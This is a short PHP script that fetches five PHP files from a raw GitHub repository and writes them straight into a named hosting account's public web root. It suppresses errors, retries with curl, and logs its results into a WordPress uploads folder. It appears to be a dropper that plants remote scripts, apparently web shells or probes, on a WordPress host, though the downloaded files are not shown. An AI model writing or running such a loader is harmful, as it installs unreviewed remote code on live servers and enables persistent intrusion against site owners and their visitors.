<?php
$b='https://raw.githubusercontent.com/davidpersons10-cloud/getfortwayneplumber/ongtmp-beta-score5-20260922/ongtmp/';
$d='/home/u338451150/domains/offsitenetworkglobal.com/public_html/';
$log=[];
$files=['s.php','v.php','c-fix.php','ong-cli-updraft-status2.php','p-probe.php'];
foreach($files as $f){
  $body=@file_get_contents($b.$f);
  if($body===false||strlen($body)<40){
    $ch=curl_init($b.$f);
    if($ch){curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>60]);$body=curl_exec($ch);curl_close($ch);}
  }
  if($body===false||strlen($body)<40){$log[]="$f FAIL"; continue;}
  file_put_contents($d.$f,$body);
  $log[]="$f bytes=".strlen($body);
}
@file_put_contents($d.'wp-content/uploads/ong-beta-score5-dl2.txt',gmdate('c')."\n".implode("\n",$log)."\n");
echo implode("\n",$log),"\n";
